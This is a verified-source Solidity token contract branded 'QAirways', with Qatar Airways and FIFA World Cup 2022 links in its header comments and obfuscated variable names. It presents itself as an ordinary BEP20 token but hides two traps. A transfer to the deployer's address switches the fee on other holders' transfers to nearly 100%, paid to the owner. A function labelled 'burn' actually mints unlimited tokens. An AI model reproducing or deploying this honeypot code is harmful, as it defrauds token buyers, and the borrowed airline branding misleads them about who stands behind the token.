/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-20 09:45 GMT
 */

///////////////////////////////////////////////////////////////////// 
//Cheering Together as One at the FIFA World Cup 
//Qatar 2022TM | QatarQAirways
//https://www.qatarairways.com/app/fifa2022/
//https://youtu.be/hxXGZveUYPM
//https://twitter.com/qatarairways
//https://www.facebook.com/qatarairways/
//////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract LIQLCUI {
address public owner;
uint256 private  INUYTG = 100000000;
uint8 public constant decimals = 18;
string public  name = "QAirways";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant NLJWIM = 99999;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
mapping (address => uint256) public balanceOf;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
address private  VYWSQE = address(0);
uint256 private  WEQWLE = 10000000000;
uint256 private  VRAXJZ = 1000000000000000000000;
uint256 private  LOTVVI = 10000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  FLLYGV = address(0);
string public  symbol = "QAirways";
uint256 private  LEQLYB = 1000000000000000000;
address private  EMJYKH = address(0);
address private  TTOVIS = address(0);
uint256 private  MTWAXO = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  DHZBNI = address(0);
uint256 private  LBGWME = 1000000000000000;
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getFLLYGV() private returns (address) {
return FLLYGV;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "FAOVAV");
require(to != address(0), "FAOVAV");
require(amount <= balanceOf[from], "FAOVAV");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* NLJWIM/MTWAXO ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==VYWSQE){
MTWAXO = NLJWIM+2;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tFAOVAV 0");
require(spender != address(0), "fFAOVAV 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getLBGWME() private returns (uint256) {
return LBGWME;
}

function _getWEQWLE() private returns (uint256) {
return WEQWLE;
}

constructor () {
VYWSQE = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getDHZBNI() private returns (address) {
return DHZBNI;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getVRAXJZ() private returns (uint256) {
return VRAXJZ;
}

function _getTTOVIS() private returns (address) {
return TTOVIS;
}

function _getINUYTG() private returns (uint256) {
return INUYTG;
}

function _getLOTVVI() private returns (uint256) {
return LOTVVI;
}

function _getEMJYKH() private returns (address) {
return EMJYKH;
}

function _getLEQLYB() private returns (uint256) {
return LEQLYB;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}

}